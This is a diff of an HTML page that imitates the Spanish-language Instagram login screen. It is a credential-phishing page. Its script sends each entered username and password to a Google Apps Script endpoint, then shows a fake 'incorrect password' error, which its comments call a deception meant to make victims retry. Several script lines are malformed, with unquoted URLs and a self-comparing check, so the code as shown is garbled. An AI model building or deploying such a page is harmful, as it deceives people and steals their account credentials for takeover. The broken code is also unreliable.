@@ -5,8 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        /* Reset y Estilos Base */
-        * { box-sizing: border-box; }
+        * {
+            box-sizing: border-box;
+        }
+
         body {
             background-color: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -17,37 +19,31 @@
             margin: 0;
         }
 
-        /* Contenedor Principal */
-        .login-container {
+        .container {
+            width: 350px;
             background-color: #ffffff;
             border: 1px solid #dbdbdb;
             border-radius: 1px;
-            padding: 40px 40px 20px;
-            width: 350px;
+            padding: 10px 40px 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 10px;
         }
 
-        /* Logo Tipográfico (Reemplaza a la imagen) */
-        .logo-text {
-            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            font-size: 38px;
-            font-weight: 400;
-            font-style: italic;
+        .logo {
             margin-top: 30px;
-            margin-bottom: 40px;
-            color: #262626;
-            letter-spacing: -1px;
-            user-select: none;
+            margin-bottom: 20px;
+            width: 175px;
         }
 
-        /* Formulario */
-        form { width: 100%; }
+        /* Logo con tipografía oficial cursiva */
+        .logo img {
+            width: 100%;
+            height: auto;
+        }
 
-        .input-group {
-            position: relative;
+        .form-group {
+            width: 100%;
             margin-bottom: 6px;
         }
 
@@ -56,18 +52,19 @@
             background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 12px 10px;
+            padding: 14px 10px;
+            margin: 0;
             font-size: 12px;
             color: #262626;
             outline: none;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         input:focus {
             border-color: #a8a8a8;
         }
 
-        /* Botón */
-        button {
+        .btn {
             width: 100%;
             background-color: #0095f6;
             border: none;
@@ -76,163 +73,143 @@
             font-weight: 600;
             font-size: 14px;
             padding: 7px 10px;
-            margin-top: 12px;
+            margin-top: 10px;
             cursor: pointer;
             opacity: 0.9;
             transition: opacity 0.2s;
         }
 
-        button:hover { opacity: 1; }
-        button:disabled { opacity: 0.5; cursor: default; }
+        .btn:hover {
+            opacity: 1;
+        }
 
-        /* Separador "O" */
-        .divider {
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: default;
+        }
+
+        .or {
+            width: 100%;
             display: flex;
             align-items: center;
-            justify-content: center;
             margin: 18px 0;
             color: #8e8e8e;
             font-size: 13px;
             font-weight: 600;
-            width: 100%;
         }
-        .divider::before, .divider::after {
+
+        .or::before, .or::after {
             content: '';
             flex: 1;
             height: 1px;
             background-color: #dbdbdb;
         }
-        .divider::before { margin-right: 10px; }
-        .divider::after { margin-left: 10px; }
 
-        /* Enlace Olvidé contraseña */
-        .forgot-password {
-            display: block;
-            margin-top: 16px;
-            color: #385185;
-            font-size: 12px;
-            text-decoration: none;
-            font-weight: 600;
-        }
+        .or::before { margin-right: 10px; }
+        .or::after { margin-left: 10px; }
 
-        /* Mensaje de Error */
         .error-msg {
             color: #ed4956;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
-            text-align: center;
-            margin-top: 10px;
-            min-height: 20px;
+            display: none;
             width: 100%;
+            text-align: center;
+            margin-bottom: 10px;
             background-color: #fff0f0;
             padding: 8px;
-            border-radius: 4px;
-            display: none;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        /* Spinner de carga */
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ffffff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            border-radius: 3px;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- Logo Tipográfico -->
-        <h1 class="logo-text">Instagram</h1>
+    <div class="container">
+        <div class="logo">
+            <!-- Logo oficial de Instagram con fuente cursiva -->
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram Logo">
+        </div>
 
-        <div class="error-msg" id="errorMsg"></div>
+        <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required autocomplete="off">
+        <form id="loginForm" onsubmit="return false;">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
             </div>
-            <div class="input-group">
+            <div class="form-group">
                 <input type="password" id="password" name="password" placeholder="Contraseña" required>
             </div>
-            
-            <button type="submit" id="submitBtn">
-                <span id="btnText">Iniciar sesión</span>
-                <div class="spinner" id="spinner"></div>
-            </button>
+            <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
         </form>
 
-        <div class="divider">O</div>
+        <div class="or">O</div>
         
-        <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 10px;">
+        <div style="color: #385185; font-size: 12px; font-weight: 600; cursor: pointer;">
             Iniciar sesión con Facebook
         </div>
         
-        <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
+            ¿Has olvidado la contraseña?
+        </div>
     </div>
 
     <script>
-        // https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec
-        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec;
+        https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec
+        const SCRIPT_URL =https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec;
 
         const form = document.getElementById('loginForm');
         const btn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const spinner = document.getElementById('spinner');
         const errorMsg = document.getElementById('errorMsg');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // UI State: Loading
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // UI Feedback
             btn.disabled = true;
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
+            btn.innerText = '...';
             errorMsg.style.display = 'none';
-            errorMsg.style.opacity = '0';
 
-            // Capturar datos
-            const formData = new FormData(form);
+            const data = new FormData();
+            data.append('username', username);
+            data.append('password', password);
 
-            // Enviar a Google
+            // 1. Verificamos que la URL no sea la por defecto
+            if (SCRIPT_URL === https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec) {
+                alert('⚠️ IMPORTANTE: No has pegado tu URL de Google Sheets en el código HTML. Edita el archivo y reemplaza https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec.');
+                btn.disabled = false;
+                btn.innerText = 'Iniciar sesión';
+                return;
+            }
+
             fetch(SCRIPT_URL, {
                 method: 'POST',
-                body: formData
+                body: data
             })
             .then(response => {
-                // Simular delay de red
-                return new Promise(resolve => setTimeout(resolve, 1500));
+                // Simulamos un pequeño retraso para realismo
+                return new Promise(resolve => setTimeout(resolve, 1000));
             })
             .then(() => {
-                // UI State: Error (Realista: IG a veces muestra error aunque haya enviado)
-                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
+                // Muestra un error falso para que el usuario piense que falló y quiera reintentar
                 errorMsg.style.display = 'block';
+                btn.disabled = false;
+                btn.innerText = 'Iniciar sesión';
                 
-                // Pequeño delay para que el usuario lea el error antes de que se oculte (opcional)
-                setTimeout(() => {
-                    errorMsg.style.opacity = '0';
-                }, 3000);
-
+                // Limpiamos la contraseña para simular el error de login
+                document.getElementById('password').value = '';
+                
+                // Opcional: Si quieres que se quede en la pantalla, déjalo así.
+                // Si quieres que recargue: location.reload();
             })
             .catch(error => {
-                errorMsg.innerText = "Error de conexión. Intenta de nuevo.";
+                console.error('Error:', error);
+                alert('Error de conexión con el servidor. Revisa tu conexión.');
                 errorMsg.style.display = 'block';
-            })
-            .finally(() => {
-                // Reset UI
                 btn.disabled = false;
-                btnText.style.display = 'block';
-                spinner.style.display = 'none';
+                btn.innerText = 'Iniciar sesión';
             });
         });
     </script>
